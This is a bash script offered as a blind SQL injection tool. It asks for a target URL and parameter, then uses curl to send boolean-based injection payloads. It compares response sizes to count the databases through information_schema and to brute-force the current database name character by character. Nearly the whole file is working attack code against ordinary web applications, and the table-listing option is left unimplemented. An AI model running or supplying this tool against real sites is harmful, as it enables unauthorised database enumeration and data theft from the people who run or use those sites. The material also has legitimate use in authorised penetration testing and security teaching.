#!/bin/bash

echo "Welcome to the Blind SQL Injection Tool"
echo "---------------------------------------"
echo "1. List database names"
echo "2. List table names from a specific database"
echo "3. Brute force database name"
echo "Select an option: "
read -r ACTION

echo "Select HTTP method:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
[[ "$METHOD_CHOICE" -eq 2 ]] && METHOD="POST"

echo "Enter the target URL: "
read -r URL

echo "Enter the parameter to test (e.g., id): "
read -r PARAMETER

# Function to send requests with SQL injection
send_request() {
    local query="$1"
    local injection="${PARAMETER}=${query}"
    local response

    if [ "$METHOD" == "POST" ]; then
        response=$(curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null)
    else
        response=$(curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null)
    fi

    echo "$response"
}

# Function to extract the length of the information by response length comparison
extract_length() {
    local test_length
    local length
    local response_lengths=()
    local significant_difference=10

    for length in {1..20}; do
        echo -n "Making request with count $length..."
        test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -")
        response_lengths[length]=$test_length
        echo " Length: ${response_lengths[length]}"
    done

    for length in {1..20}; do
        local differences=0
        for compare_length in {1..20}; do
            if [ "${response_lengths[length]}" -ne "${response_lengths[compare_length]}" ]; then
                differences=$((differences + 1))
            fi
        done

        if [ "$differences" -ge "$significant_difference" ]; then
            echo "The correct count of databases is likely: $length (response length: ${response_lengths[length]})"
            return
        fi
    done

    echo "Failed to determine the correct count of databases."
}

# Function to brute force the database name character by character
# Function to brute force the database name character by character
brute_force_db_name() {
    local db_name=""
    local position=1
    local reference_length=$(send_request "1' and '1'='2" -- -)
    local current_length
    local found_char=false

    echo "Brute forcing the database name..."

    while : ; do
        found_char=false
        for ascii in {97..122}; do  # Adjust the range for the characters you expect
            local char=$(printf \\$(printf '%03o' $ascii))
            local query="1' or substring(database(),$position,1)='$char' -- -"
            current_length=$(send_request "$query")

            echo "Testing character '$char' at position $position: Response Length - $current_length"

            if [[ "$current_length" -ne "$reference_length" ]]; then
                db_name+="$char"
                echo "Found character '$char' at position $position with length $current_length"
                found_char=true
                # Update reference length if required here
                break
            fi
        done

        if ! $found_char; then
            echo "No more characters found. Database name likely complete."
            break
        fi
        ((position++))
    done

    echo "Database name: $db_name"
}
# Main functionality to list databases, tables, or brute force database name
list_items() {
    case "$ACTION" in
        1)
            extract_length
            ;;
        2)
            echo "Enter the database name to list tables: "
            read -r DATABASE_NAME
            echo "Functionality to list table names is not implemented in this script."
            ;;
        3)
            brute_force_db_name
            ;;
        *)
            echo "Invalid option."
            exit 1
            ;;
    esac
}

list_items

